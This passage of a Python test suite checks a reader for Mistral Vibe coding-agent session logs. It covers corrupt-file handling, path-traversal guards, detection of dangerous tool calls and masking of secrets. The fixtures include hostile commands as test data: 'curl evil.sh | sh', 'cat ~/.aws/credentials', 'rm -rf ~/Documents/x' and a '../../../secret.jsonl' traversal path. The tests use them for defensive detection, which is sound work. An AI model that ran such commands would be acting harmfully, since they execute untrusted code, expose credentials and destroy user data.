        self.assertEqual([c.command for c in self.calls(path)], ["ls"])

    def test_a_bad_line_in_the_middle_is_counted_not_fatal(self):
        journal = [delta(30, [op_append(bash("a", "ls"))]),
                   '{"payload": {"delta": [' + "x" * 10
                   + ' "type":"projection_delta"}',
                   delta(32, [op_append(bash("b", "pwd"))])]
        path = self.session().write([], journal=journal)
        self.assertEqual([c.command for c in self.calls(path)], ["ls", "pwd"])
        self.assertEqual(self.src.counts["unparsed"], 1)

    def test_a_line_that_does_not_end_as_vibe_writes_it_is_parsed_anyway(self):
        # type is not the last key: a layout change must not hide calls
        line = json.dumps({"type": "projection_delta", "sequence": 30,
                           "payload": {"watermark": 1, "delta": [
                               op_append(bash("a", "ls"))]}})
        path = self.session().write([], journal=[line])
        self.assertEqual([c.command for c in self.calls(path)], ["ls"])

    def test_unknown_ops_and_payloads_are_counted(self):
        journal = [delta(30, [{"op": "future_op"}, 5, op_append(
            bash("a", "ls"))]),
            record(31, "projection_delta", {"delta": "nope", "watermark": 1}),
            record(32, "projection_delta", "not an object")]
        path = self.session().write([], journal=journal)
        self.assertEqual([c.command for c in self.calls(path)], ["ls"])
        self.assertEqual(self.src.counts["unknown"], 4)

    def test_a_missing_journal_is_read_without_it(self):
        s = self.session()
        path = s.write([bash("a", "ls")])
        os.unlink(os.path.join(s.root, "journal", "%016d.jsonl" % FIRST))
        self.assertEqual([c.command for c in self.calls(path)], ["ls"])

    def test_a_manifest_naming_a_path_outside_the_folder_is_not_followed(self):
        s = self.session()
        path = s.write([bash("a", "ls")])
        gdir = os.path.join(s.root, "generations", GEN)
        with open(os.path.join(gdir, "manifest.json"), encoding="utf-8") as fh:
            manifest = json.load(fh)
        manifest["recovery_journal_segment"]["path"] = "../../../secret.jsonl"
        manifest["projection_state"]["path"] = "../../CURRENT"
        outside = os.path.join(s.root, "..", "secret.jsonl")
        with open(outside, "w", encoding="utf-8") as fh:
            fh.write(delta(30, [op_append(bash("x", "evil"))]) + "\n")
        with open(os.path.join(gdir, "manifest.json"), "w", encoding="utf-8") as fh:
            json.dump(manifest, fh)
        self.assertEqual([c.command for c in self.calls(path)], ["ls"])


class UnifiedDamaged(VibeCase):

    def _read(self, path):
        err = io.StringIO()
        with contextlib.redirect_stderr(err):
            store = self.store(path)
            calls = list(self.src.tool_calls(store))
            list(self.src.tool_calls(store))
            list(self.src.secret_texts(store))
        return calls, err.getvalue().splitlines()

    def test_a_garbage_pointer_warns_once_and_others_are_still_read(self):
        bad = self.session(sid=CHILD)
        bad_path = bad.write([bash("a", "ls")])
        bad.put("CURRENT", b"\x00\xff\xfe not json\n" * 4)
        good_path = self.session().write([bash("b", "pwd")])
        calls, warnings = self._read(bad_path)
        self.assertEqual(calls, [])
        self.assertEqual(len(warnings), 1, warnings)
        self.assertIn(bad_path, warnings[0])
        self.assertEqual(self.src.counts["unreadable_stores"], 1)
        self.assertEqual(self.src.unreadable, {"CURRENT is not JSON": 1})
        self.assertEqual([c.command for c in self.calls(good_path)], ["pwd"])

    def test_an_empty_or_truncated_pointer(self):
        s = self.session()
        path = s.write([bash("a", "ls")])
        for data in (b"", b'{"generation":"0000', b"[]", b"7", b"null"):
            self.src.reset()
            s.put("CURRENT", data)
            calls, warnings = self._read(path)
            self.assertEqual(calls, [], data)
            self.assertEqual(self.src.counts["unreadable_stores"], 1, data)

    def test_another_store_format_is_unreadable(self):
        path = self.session().write([bash("a", "ls")],
                                    fmt="mistral.vibe.unified-session-store/v2")
        calls, warnings = self._read(path)
        self.assertEqual(calls, [])
        self.assertEqual(self.src.unreadable,
                         {"a newer Vibe session store format": 1})
        other = self.session(sid=CHILD).write([], fmt="something.else/v1")
        self.src.reset()
        self._read(other)
        self.assertEqual(self.src.unreadable, {"not a Vibe session store": 1})

    def test_a_newer_minor_is_read_with_one_warning(self):
        path = self.session().write([bash("a", "ls")], minor=10)
        calls, warnings = self._read(path)
        self.assertEqual([c.command for c in calls], ["ls"])
        self.assertEqual(len(warnings), 1)
        self.assertIn("minor 10", warnings[0])
        self.assertEqual(self.src.counts["unreadable_stores"], 0)

    def test_the_checked_minor_is_read_without_a_warning(self):
        path = self.session().write([bash("a", "ls")], minor=9)
        calls, warnings = self._read(path)
        self.assertEqual((len(calls), warnings), (1, []))

    def test_a_generation_that_is_not_digits_is_unreadable(self):
        s = self.session()
        path = s.write([bash("a", "ls")])
        s.put("CURRENT", {"generation": "../..", "session_id": SID,
                          "store_format": mv.STORE_FORMAT,
                          "store_format_minor": 9})
        calls, _w = self._read(path)
        self.assertEqual(calls, [])
        self.assertEqual(self.src.counts["unreadable_stores"], 1)

    def test_a_pointer_to_a_collected_generation_is_unreadable(self):
        s = self.session()
        path = s.write([bash("a", "ls")])
        shutil.rmtree(os.path.join(s.root, "generations", GEN))
        calls, warnings = self._read(path)
        self.assertEqual(calls, [])
        self.assertEqual(self.src.counts["unreadable_stores"], 1)

    def test_a_generation_collected_during_the_read_is_retried_once(self):
        s = self.session()
        path = s.write([bash("old", "ls")])
        newer = Session(self.save)
        real = mv.MistralVibeSource._load_once
        state = {"n": 0}

        def moved(source, store, first):
            state["n"] += 1
            if state["n"] == 1:
                # Vibe publishes the next generation and collects this one
                shutil.rmtree(os.path.join(s.root, "generations", GEN))
                newer.write([bash("new", "pwd")], generation="0000000000000041",
                            seq=41)
                raise OSError("gone")
            return real(source, store, first)
        with mock.patch.object(mv.MistralVibeSource, "_load_once", moved):
            got = self.calls(path)
        self.assertEqual(state["n"], 2)
        self.assertEqual([c.command for c in got], ["pwd"])
        self.assertEqual(self.src.counts["unreadable_stores"], 0)

    def test_a_chunk_that_is_missing_or_not_a_list(self):
        s = self.session()
        path = s.write([bash("a", "ls")])
        chunk = os.path.join(s.root, "chunks", os.listdir(
            os.path.join(s.root, "chunks"))[0])
        with open(chunk, "w", encoding="utf-8") as fh:
            fh.write('{"not": "a list"}')
        self.assertEqual(self._read(path)[0], [])
        self.assertEqual(self.src.counts["unreadable_stores"], 1)
        self.src.reset()
        os.unlink(chunk)
        self.assertEqual(self._read(path)[0], [])
        self.assertEqual(self.src.counts["unreadable_stores"], 1)

    def test_a_chunk_name_that_is_not_a_digest_is_not_opened(self):
        s = self.session()
        path = s.write([bash("a", "ls")])
        gdir = os.path.join(s.root, "generations", GEN)
        with open(os.path.join(gdir, "manifest.json"), encoding="utf-8") as fh:
            manifest = json.load(fh)
        manifest["projection_state"]["chunks"] = ["../../meta"]
        with open(os.path.join(gdir, "manifest.json"), "w", encoding="utf-8") as fh:
            json.dump(manifest, fh)
        calls, _w = self._read(path)
        self.assertEqual(calls, [])
        self.assertEqual(self.src.unreadable,
                         {"a chunk name that is not a digest": 1})

    def test_a_document_over_the_limit_is_not_read(self):
        path = self.session().write([bash("a", "ls" + "x" * 500)])
        with mock.patch.object(mv, "MAX_DOC", 200):
            calls, _w = self._read(path)
        self.assertEqual(calls, [])
        self.assertEqual(self.src.counts["unreadable_stores"], 1)
        self.assertTrue(list(self.src.unreadable)[0].startswith("a file over"))

    def test_non_utf8_bytes_in_a_chunk_and_the_journal(self):
        s = self.session()
        e = bash("a", "echo caf\u00e9")
        body = canon([e]).encode("utf-8").replace(
            "caf\u00e9".encode("utf-8"), b"caf\xe9")
        digest = sha(body)
        path = s.write([], chunked=False)
        s.put("chunks/%s.json" % digest, body)
        gdir = os.path.join(s.root, "generations", GEN)
        with open(os.path.join(gdir, "manifest.json"), encoding="utf-8") as fh:
            manifest = json.load(fh)
        manifest["projection_state"]["chunks"] = [digest]
        with open(os.path.join(gdir, "manifest.json"), "w", encoding="utf-8") as fh:
            json.dump(manifest, fh)
        line = delta(30, [op_append(bash("j", "echo ok"))]).encode("utf-8")
        s.put("journal/%016d.jsonl" % FIRST,
              b"\xff\xfe garbage\n" + line + b"\n")
        got = self.calls(path)
        self.assertEqual([c.tool_call_id for c in got],
                         ["effect-a", "effect-j"])
        self.assertEqual(got[0].command, "echo caf\udce9")
        # the bad bytes survive to clean unchanged
        texts = [t for t in self.src.secret_texts(self.store(path))]
        self.assertTrue(any("caf\udce9" in json.dumps(t.node,
                                                       ensure_ascii=False)
                            for t in texts))

    def test_a_store_that_vanished(self):
        s = self.session()
        path = s.write([bash("a", "ls")])
        store = self.store(path)
        shutil.rmtree(s.root)
        err = io.StringIO()
        with contextlib.redirect_stderr(err):
            self.assertEqual(list(self.src.tool_calls(store)), [])
            self.assertEqual(list(self.src.secret_texts(store)), [])
        self.assertEqual(len(err.getvalue().splitlines()), 1)

    def test_a_deeply_nested_document_is_read_as_unreadable_not_a_crash(self):
        s = self.session()
        path = s.write([bash("a", "ls")])
        gdir = os.path.join(s.root, "generations", GEN)
        with open(os.path.join(gdir, "projection-state.json"), "w", encoding="utf-8") as fh:
            fh.write("[" * 100000 + "]" * 100000)
        calls, _w = self._read(path)
        self.assertEqual(calls, [])
        self.assertEqual(self.src.counts["unreadable_stores"], 1)

    def test_reading_never_writes(self):
        s = self.session()
        path = s.write([message(1, "user", "go"), bash("a", "ls", output="x"),
                        bash("b", "pwd")],
                       journal=[delta(30, [op_append(bash("c", "id"))]),
                                action_intent(31)])
        before = tree_state(self.save)
        store = self.store(path)
        list(self.src.tool_calls(store))
        list(self.src.secret_texts(store))
        res = self.src.mask(store, [SECRET])
        self.assertEqual(tree_state(self.save), before)
        self.assertEqual((res.changed, res.skipped), (False, "read-only"))


# --------------------------------------------------------------------------
# The 2.x layout
# --------------------------------------------------------------------------

class LegacyCalls(VibeCase):

    def test_a_call_and_its_result(self):
        rows = [user_row("list"),
                assistant_row([legacy_call("call_1", "bash",
                                           {"command": "ls -la"})]),
                tool_row("call_1", "bash", "total 0\n"),
                {"role": "assistant", "content": "done"}]
        path = self.legacy(rows)
        got = self.calls(path)
        self.assertEqual(len(got), 1)
        call = got[0]
        self.assertEqual((call.tool_name, call.tool_call_id, call.kind,
                          call.known, call.command, call.output, call.actor),
                         ("bash", "call_1", "shell", True, "ls -la",
                          "total 0\n", "agent"))
        self.assertEqual((call.session, call.project),
                         ("ab12cd34-0000-4000-8000-000000000000", CWD))
        self.assertIsNone(call.timestamp)
        self.assertEqual(call.not_after, "2026-09-20T10:30:00Z")

    def test_file_tools_take_file_path(self):
        rows = [assistant_row([
            legacy_call("r", "read_file", {"file_path": "/home/dev/.env"}),
            legacy_call("w", "write_file", {"file_path": "/home/dev/a",
                                            "content": "x"}),
            legacy_call("s", "search_replace", {"file_path": "/home/dev/b",
                                                "content": "<<<<"}),
            legacy_call("g", "grep", {"pattern": "x"}),
            legacy_call("t", "todo", {"action": "read"}),
            legacy_call("u", "some_mcp_tool", {"a": 1}),
        ])]
        got = self.by_id(self.legacy(rows))
        self.assertEqual((got["r"].kind, got["r"].paths),
                         ("read", ("/home/dev/.env",)))
        self.assertEqual((got["w"].kind, got["w"].paths),
                         ("write", ("/home/dev/a",)))
        self.assertEqual((got["s"].kind, got["s"].paths),
                         ("write", ("/home/dev/b",)))
        self.assertEqual((got["g"].kind, got["g"].known), ("other", True))
        self.assertEqual((got["t"].kind, got["t"].known), ("other", True))
        self.assertEqual((got["u"].kind, got["u"].known), ("other", False))

    def test_arguments_are_a_json_string_and_may_be_broken(self):
        rows = [assistant_row([legacy_call("a", "bash", '{"command": "pwd"}'),
                               legacy_call("b", "bash", '{"command": "pw'),
                               legacy_call("c", "bash", "")])]
        got = self.by_id(self.legacy(rows))
        self.assertEqual(got["a"].command, "pwd")
        self.assertIsNone(got["b"].command)
        self.assertEqual(got["b"].tool_input, {"_raw": '{"command": "pw'})
        self.assertIsNone(got["c"].command)

    def test_a_command_the_user_ran_with_a_bang(self):
        rows = [manual_row("git status", stdout="clean\n", stderr="warn\n")]
        got = self.calls(self.legacy(rows))
        self.assertEqual(len(got), 1)
        call = got[0]
        self.assertEqual((call.actor, call.kind, call.command, call.output,
                          call.workdir, call.timestamp),
                         ("user", "shell", "git status", "clean\n\nwarn\n",
                          CWD, "2026-10-20T06:06:51Z"))

    def test_the_same_call_written_twice_is_one_call(self):
        row = assistant_row([legacy_call("dup", "bash", {"command": "ls"})])
        got = self.calls(self.legacy([row, row, tool_row("dup", "bash", "x")]))
        self.assertEqual(len(got), 1)
        self.assertEqual(got[0].output, "x")

    def test_a_call_with_no_id_is_kept(self):
        rows = [{"role": "assistant", "content": "", "tool_calls": [
            {"function": {"name": "bash", "arguments": '{"command": "ls"}'}}]}]
        self.assertEqual(len(self.calls(self.legacy(rows))), 1)

    def test_a_folder_without_meta_names_the_session_by_its_folder(self):
        path = self.legacy([assistant_row([legacy_call(
            "a", "bash", {"command": "ls"})])], meta=False)
        call = self.calls(path)[0]
        self.assertEqual(call.session, "session_20260920_101500_ab12cd34")
        self.assertIsNone(call.project)
        self.assertIsNotNone(call.not_after)

    def test_malformed_lines_are_counted_and_the_rest_read(self):
        raw = (json.dumps(assistant_row([legacy_call(
            "a", "bash", {"command": "ls"})])) + "\n"
            + "{not json\n" + "[1, 2]\n" + '"str"\n' + "\n"
            + json.dumps({"role": "assistant", "tool_calls": [
                5, {"id": "x", "function": 3}]}) + "\n"
            + json.dumps(assistant_row([legacy_call(
                "b", "bash", {"command": "pwd"})])) + "\n").encode("utf-8")
        path = self.legacy(None, raw=raw)
        got = self.calls(path)
        self.assertEqual([c.tool_call_id for c in got], ["a", "x", "b"])
        self.assertEqual(self.src.counts["unparsed"], 1)
        self.assertEqual(self.src.counts["unknown"], 3)

    def test_a_truncated_last_line_is_skipped_quietly(self):
        good = json.dumps(assistant_row([legacy_call(
            "a", "bash", {"command": "ls"})])) + "\n"
        cut = json.dumps(assistant_row([legacy_call(
            "b", "bash", {"command": "rm -rf ~/x"})]))[:50]
        path = self.legacy(None, raw=(good + cut).encode("utf-8"))
        err = io.StringIO()
        with contextlib.redirect_stderr(err):
            calls = self.calls(path)
            list(self.src.secret_texts(self.store(path)))
        self.assertEqual([c.tool_call_id for c in calls], ["a"])
        self.assertEqual(err.getvalue(), "")
        self.assertEqual(self.src.counts["unparsed"], 0)

    def test_non_utf8_and_a_byte_order_mark(self):
        raw = (b"\xef\xbb\xbf" + json.dumps(assistant_row([legacy_call(
            "a", "bash", {"command": "echo ok"})])).encode("utf-8") + b"\r\n"
            + b"\xff\xfe\x00 garbage\n")
        got = self.calls(self.legacy(None, raw=raw))
        self.assertEqual([c.command for c in got], ["echo ok"])

    def test_an_empty_file(self):
        path = self.legacy(None, raw=b"")
        self.assertEqual(self.calls(path), [])
        self.assertEqual(self.src.counts["unreadable_stores"], 0)

    def test_a_very_long_line_is_read(self):
        big = "x" * (3 * 1024 * 1024)
        rows = [assistant_row([legacy_call("a", "bash", {"command": "ls"})]),
                tool_row("a", "bash", big)]
        path = self.legacy(rows)
        got = self.calls(path)
        self.assertEqual(len(got[0].output), mv.OUTPUT_MAX)
        texts = list(self.src.secret_texts(self.store(path)))
        self.assertEqual(len(texts), 2)


# --------------------------------------------------------------------------
# watch and clean
# --------------------------------------------------------------------------

class Judged(VibeCase):

    def rules(self, call):
        hits = watch.judge(call)[0]
        return [(h["rule"], h["evidence"]) for h in hits]

    def test_a_dangerous_shell_call_is_flagged(self):
        got = self.by_id(self.session().write([
            bash("rm", "rm -rf ~/Documents/x"),
            bash("aws", "cat ~/.aws/credentials")]))
        self.assertEqual(self.rules(got["effect-rm"]),
                         [("fs.destructive", "rm -rf ~/Documents/x")])
        self.assertEqual(self.rules(got["effect-aws"]),
                         [("cred.read", "cat ~/.aws/credentials")])

    def test_a_dangerous_command_the_user_ran_is_flagged(self):
        got = self.calls(self.legacy([manual_row("cat ~/.aws/credentials")]))
        self.assertEqual(self.rules(got[0]),
                         [("cred.read", "cat ~/.aws/credentials")])

    def test_a_credential_read_by_the_read_tool_is_flagged(self):
        got = self.by_id(self.session().write([
            effect("env", "file_system.read_file", {"path": "/home/dev/.env"}),
            effect("ok", "file_system.read_file", {"path": "/home/dev/a.py"})]))
        self.assertTrue(self.rules(got["effect-env"]))
        self.assertEqual(self.rules(got["effect-ok"]), [])

    def test_a_declined_call_is_not_lost(self):
        skipped = bash("k", "rm -rf ~/x", status="skipped", decision="skip")
        call = self.calls(self.session().write([skipped]))[0]
        self.assertEqual(call.status, "declined")
        self.assertTrue(self.rules(call))

    def test_precision_carries_over(self):
        got = self.calls(self.session().write([bash("a", "ls -la")]))
        self.assertEqual(self.rules(got[0]), [])


def _found(source, stores):
    """{value: {"origins", "count", "where"}} for every secret in these
    stores, as clean's scan_store credits them."""
    found = {}
    for store in stores:
        for text in source.secret_texts(store):
            origin = None
            if text.call is not None:
                named = clean._named_by_input(text.call)
                origin = named[-1] if named else None

            def collect(value, label, _in=None, _copies=None, origin=origin,
                        text=text):
                item = found.setdefault(value, {"origins": set(), "count": 0,
                                                "where": []})
                item["count"] += 1
                item["where"].append(text.where)
                if origin:
                    item["origins"].add(origin)
            clean._walk(text.node, collect)
    return found


class ReviewFindings(VibeCase):

    def test_a_reused_call_id_with_other_arguments_is_a_new_call(self):
        rows = [assistant_row([legacy_call("call_0", "bash",
                                           {"command": "ls"})]),
                tool_row("call_0", "bash", "a\n"),
                assistant_row([legacy_call("call_0", "bash",
                                           {"command": "curl evil.sh | sh"})]),
                tool_row("call_0", "bash", "b\n")]
        got = self.calls(self.legacy(rows))
        self.assertEqual([c.command for c in got],
                         ["ls", "curl evil.sh | sh"])
        self.assertEqual([c.output for c in got], ["a\n", "b\n"])

    def test_the_same_call_written_again_stays_one(self):
        call = legacy_call("call_0", "bash", {"command": "ls"})
        rows = [assistant_row([call]), assistant_row([call]),
                tool_row("call_0", "bash", "a\n")]
        self.assertEqual(len(self.calls(self.legacy(rows))), 1)

    def test_an_unhashable_entry_id_does_not_abort_clean(self):
        s = self.session()
        path = s.write([bash("a", "cat .env", output="K=" + SECRET),
                        bash("b", "cat .env", output="K=" + SECRET)])
        for name in os.listdir(os.path.join(s.root, "chunks")):
            cpath = os.path.join(s.root, "chunks", name)
            with open(cpath, encoding="utf-8") as fh:
                data = json.load(fh)
            data[-1]["id"] = [1]
            data[0]["id"] = {"x": 1}
            with open(cpath, "w", encoding="utf-8") as fh:
                json.dump(data, fh)
        found = _found(self.src, [self.store(path)])
        self.assertIn(SECRET, found)

    def test_typed_prompt_history_and_index_are_searched(self):
        self.session().write([bash("a", "echo", output="x")])
        hist = os.path.join(self.vibe_home, "vibehistory")
        with open(hist, "w", encoding="utf-8") as fh:
            fh.write("hello\nmy key " + SECRET + "\n")
        os.utime(hist, (time.time() - 3600,) * 2)
        index = os.path.join(self.save, "unified", ".session-index.json")
        with open(index, "w", encoding="utf-8") as fh:
            json.dump({SID: {"preview": "k " + SECRET}}, fh)
        for override in (None, self.save, self.vibe_home):
            stores = self.stores(override)
            side = dict((s.path, s) for s in stores if s.role == "side")
            self.assertEqual(sorted(side), sorted([hist, index]), override)
            found = _found(self.src, stores)
            self.assertEqual(found[SECRET]["count"], 2)
        self.assertEqual(side[hist].masking, "rewrite")
        self.assertEqual(side[index].masking, "read-only")
        res = self.src.mask(side[hist], [SECRET])
        self.assertTrue(res.changed)
        with open(hist, encoding="utf-8") as fh:
            self.assertNotIn(SECRET, fh.read())


class Secrets(VibeCase):

    def test_output_after_cat_env_names_its_file(self):
        path = self.session().write([
            bash("a", "cat .env", output="STRIPE_KEY=" + SECRET + "\n")])
        found = _found(self.src, [self.store(path)])
        self.assertIn(SECRET, found)
        self.assertEqual(found[SECRET]["origins"], set([".env"]))

    def test_a_secret_in_every_file_of_a_session_is_found(self):
        s = self.session()
        e = bash("a", "echo hi", output="K=" + SECRET)
        path = s.write([e], journal=[
            delta(30, [op_append(bash("j", "cat x", output=SECRET))]),
            action_intent(31)])
        # a generation and a chunk Vibe no longer replays
        old = Session(self.save)
        old.chunk([bash("old", "cat y", output="OLD=" + SECRET)])
        s.put("generations/0000000000000021/projection-state.json",
              {"snapshot": {"history": {"entries": [
                  bash("g", "cat z", output=SECRET)]}}})
        s.put("meta.json", {"session_id": SID, "title": "key " + SECRET})
        found = _found(self.src, [self.store(path)])
        wheres = " | ".join(found[SECRET]["where"])
        for part in ("chunk ", "journal 0000000000000030.jsonl line 1",
                     "generation 0000000000000021 projection-state.json",
                     "meta.json"):
            self.assertIn(part, wheres)
        self.assertGreaterEqual(found[SECRET]["count"], 5)

    def test_a_call_s_own_input_is_never_credited_as_its_output(self):
        path = self.session().write([bash("a", "echo " + SECRET, output=None)])
        credited = []
        for text in self.src.secret_texts(self.store(path)):
            if text.call is not None:
                credited.append(json.dumps(text.node))
        self.assertTrue(credited)
        self.assertFalse(any(SECRET in c for c in credited))

    def test_the_result_is_tied_to_its_call(self):
        path = self.session().write([bash("a", "cat .env", output="x=1")])
        calls = {}
        for text in self.src.secret_texts(self.store(path)):
            if text.call is not None:
                calls[text.call.tool_call_id] = text.call
        self.assertEqual(list(calls), ["effect-a"])
        self.assertEqual(calls["effect-a"].command, "cat .env")

    def test_a_unified_session_is_found_but_never_masked(self):
        s = self.session()
        path = s.write([bash("a", "cat .env", output="K=" + SECRET)])
        store = self.store(path)
        before = tree_state(self.save)
        res = self.src.mask(store, [SECRET])
        self.assertEqual((res.path, res.changed, res.skipped),
                         (path, False, "read-only"))
        self.assertEqual(tree_state(self.save), before)
        self.assertIn(SECRET, _found(self.src, [store]))

    def test_every_string_of_a_legacy_session_reaches_clean(self):
        rows = [user_row("key " + SECRET),
                assistant_row([legacy_call("a", "bash",
                                           {"command": "cat .env"})],
                              "thinking " + SECRET),
                tool_row("a", "bash", "K=" + SECRET)]
        path = self.legacy(rows)
        meta = os.path.join(os.path.dirname(path), "meta.json")
        with open(meta, "w", encoding="utf-8") as fh:
            json.dump({"session_id": "s", "title": SECRET}, fh)
        found = _found(self.src, [s for s in self.stores()])
        self.assertEqual(found[SECRET]["count"], 4)
        self.assertEqual(found[SECRET]["origins"], set([".env"]))

    def test_a_legacy_session_is_masked_and_round_trips(self):
        rows = [assistant_row([legacy_call("a", "bash",
                                           {"command": "cat .env"})]),
                tool_row("a", "bash", "K=" + SECRET)]
        path = self.legacy(rows)
        with open(path, "rb") as fh:
            original = fh.read()
        store = self.store(path)
        self.assertEqual(store.masking, "rewrite")
        res = self.src.mask(store, [SECRET])
        self.assertEqual((res.changed, res.skipped), (True, None))
        with open(path, "rb") as fh:
            after = fh.read()
        self.assertEqual(after, original.replace(
            SECRET.encode("utf-8"), _marker(SECRET).encode("utf-8")))
        with open(res.backup, "rb") as fh:
            self.assertEqual(fh.read(), original)
        self.assertEqual([f for f in _rewrite.encodings(SECRET)
                          if f in after.decode("utf-8")], [])
        self.assertEqual(len(self.calls(path)), 1)

    def test_a_legacy_file_written_just_now_is_in_use(self):
        path = self.legacy([user_row("hi " + SECRET)], age=1)
        res = self.src.mask(self.store(path), [SECRET])
        self.assertIn(res.skipped, (None, "in use"))


# --------------------------------------------------------------------------
# Big stores
# --------------------------------------------------------------------------

class Performance(VibeCase):

    def test_many_entries_and_a_long_journal_read_in_linear_time(self):
        s = self.session()
        entries = [bash("a%d" % i, "echo %d" % i, output="o" * 50, n=i)
                   for i in range(4000)]
        ops = [op_replace(bash("a%d" % i, "echo %d" % i, output="new"))
               for i in range(0, 4000, 2)]
        journal = []
        for i in range(0, len(ops), 100):
            journal.append(delta(30 + len(journal), ops[i:i + 100]))
        path = s.write(entries, journal=journal)
        t0 = time.time()
        got = self.calls(path)
        list(self.src.secret_texts(self.store(path)))
        self.assertLess(time.time() - t0, 20)
        self.assertEqual(len(got), 4000)
        self.assertEqual(got[0].output, "new")
        self.assertEqual(got[1].output, "o" * 50)

    def test_a_huge_action_intent_line_is_never_held(self):
        # 40 MB on one line, read in 1 MiB steps and dropped
        journal = [action_intent(30, size=40 * 1024 * 1024),
                   delta(31, [op_append(bash("a", "ls"))])]
        s = self.session()
        path = s.write([], journal=journal)
        with mock.patch.object(mv, "MAX_LINE", 1 << 20):
            got = self.calls(path)
        self.assertEqual([c.command for c in got], ["ls"])


if __name__ == "__main__":
    unittest.main()
